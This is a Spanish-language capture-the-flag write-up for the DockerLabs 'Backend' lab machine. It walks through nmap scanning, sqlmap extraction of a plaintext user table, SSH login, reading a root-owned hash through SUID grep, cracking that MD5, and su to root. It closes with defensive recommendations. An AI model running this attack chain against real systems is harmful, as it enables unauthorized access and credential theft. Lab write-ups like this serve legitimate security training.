# Backend — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** 4bytes  
**Fecha de creación:** 29/08/2024  
**Técnicas:** Nmap · SQLmap · SSH · find SUID · ls+grep con SUID · CrackStation · Privesc (su root con hash crackeado)

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — login con SQL Injection](#2-enumeración-web--login-con-sql-injection)
3. [SQLmap — extracción completa de la base de datos](#3-sqlmap--extracción-completa-de-la-base-de-datos)
4. [Acceso SSH](#4-acceso-ssh)
5. [Escalada de privilegios — SUID en ls y grep](#5-escalada-de-privilegios--suid-en-ls-y-grep)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh backend.tar
```

> IP asignada: `172.17.0.2`.

Escaneo rápido:

```bash
nmap -Pn 172.17.0.2
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Escaneo con versiones:

```bash
nmap -p22,80 -sCV -Pn 172.17.0.2
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-title: test page
```

---

## 2. Enumeración web — login con SQL Injection

Visitamos `http://172.17.0.2` — página "Under Development". El menú tiene una sección **Login** en `http://172.17.0.2/login.html` con campos username y password.

Vamos directamente con SQLmap — detecta y explota inyecciones SQL automáticamente.

---

## 3. SQLmap — extracción completa de la base de datos

**Paso 1 — Listar bases de datos:**

```bash
sqlmap -u http://172.17.0.2/login.html --forms --dbs --batch
```

```
[INFO] the back-end DBMS is MySQL
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users
```

> 💡 `-u` especifica la URL. `--forms` detecta formularios automáticamente. `--dbs` lista bases de datos. `--batch` responde automáticamente a todas las preguntas.

**Paso 2 — Listar tablas de la base de datos `users`:**

```bash
sqlmap -u http://172.17.0.2/login.html --forms -D users --tables --batch
```

```
Database: users
[1 table]
+----------+
| usuarios |
+----------+
```

**Paso 3 — Ver columnas de la tabla `usuarios`:**

```bash
sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios --columns --batch
```

```
Table: usuarios
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(255) |
| username | varchar(255) |
+----------+--------------+
```

**Paso 4 — Extraer el contenido completo:**

```bash
sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios -C id,password,username --dump --batch
```

```
Database: users
Table: usuarios
[3 entries]
+----+---------------+----------+
| id | password      | username |
+----+---------------+----------+
| 1  | $paco$123     | paco     |
| 2  | P123pepe3456P | pepe     |
| 3  | jjuuaann123   | juan     |
+----+---------------+----------+
```

Tres usuarios con sus contraseñas en texto claro.

---

## 4. Acceso SSH

Probamos los tres usuarios. El que funciona es **pepe**:

```bash
ssh pepe@172.17.0.2
```

```
pepe@172.17.0.2's password: P123pepe3456P
pepe@377d8cb0b1e2:~$
```

---

## 5. Escalada de privilegios — SUID en ls y grep

Intentamos sudo:

```bash
pepe@377d8cb0b1e2:~$ sudo -l
-bash: sudo: command not found
```

sudo no está disponible. Buscamos binarios con SUID (bit que permite ejecutar con los permisos del propietario):

```bash
pepe@377d8cb0b1e2:~$ find / -perm -4000 -user root 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/su
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/ls
/usr/bin/grep
```

> 💡 **`/usr/bin/ls` y `/usr/bin/grep` con SUID** son inusuales. Con SUID, estos comandos se ejecutan con permisos de root, lo que nos permite leer ficheros normalmente inaccesibles.

Usamos `ls` con SUID para listar el directorio de root:

```bash
pepe@377d8cb0b1e2:~$ /usr/bin/ls /root/
pass.hash
```

Hay un fichero `pass.hash`. Usamos `grep` con SUID para leer su contenido (GTFObins):

```bash
pepe@377d8cb0b1e2:~$ LFILE=file_to_read
pepe@377d8cb0b1e2:~$ /usr/bin/grep '' /root/pass.hash
e43833c4c9d5ac444e16bb94715a75e4
```

Parece un hash MD5. Lo crackeamos en [crackstation.net](https://crackstation.net/):

```
Hash: e43833c4c9d5ac444e16bb94715a75e4
Type: md5
Result: spongebob34
```

Contraseña de root: **spongebob34**:

```bash
pepe@377d8cb0b1e2:~$ su root
Password: spongebob34
root@377d8cb0b1e2:/home/pepe# whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **SQL Injection en formulario login** | `login.html` | Extracción de toda la base de datos |
| **Contraseñas en texto plano en DB** | Tabla `usuarios` | Acceso SSH directo |
| **ls y grep con SUID** | `/usr/bin/ls`, `/usr/bin/grep` | Lectura de ficheros de root |
| **Hash MD5 sin sal en pass.hash** | `/root/pass.hash` | Contraseña crackeada en segundos |

**Para defenderse:**
- Usar consultas parametrizadas o prepared statements — eliminan SQL injection completamente.
- Nunca almacenar contraseñas en texto plano. Usar bcrypt, scrypt o Argon2 con sal.
- MD5 no es seguro para contraseñas — es reversible con diccionarios. CrackStation tiene millones de hashes.
- Revisar regularmente binarios con SUID: `find / -perm -4000 2>/dev/null`. Quitar SUID de ls y grep — nunca deben tenerlo.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
